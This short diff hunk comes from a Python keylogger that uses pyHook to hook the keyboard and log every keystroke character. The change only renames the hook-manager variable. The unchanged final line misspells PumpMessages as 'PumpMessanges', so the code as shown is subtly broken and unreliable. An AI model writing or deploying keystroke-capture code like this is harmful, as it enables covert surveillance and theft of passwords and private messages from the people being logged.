@@ -8,7 +8,7 @@ def OnKeyboardEvent(event):
     logging.log(10,chr(event.Ascii))
     return True
 
-hooks_manager = pyHook.HookManager()
-hooks_manager.KeyDown = OnKeyboardEvent
-hooks_manager.HookKeyboard()
+managehook = pyHook.HookManager()
+managehook.KeyDown = OnKeyboardEvent
+managehook.HookKeyboard()
 pythoncom.PumpMessanges()
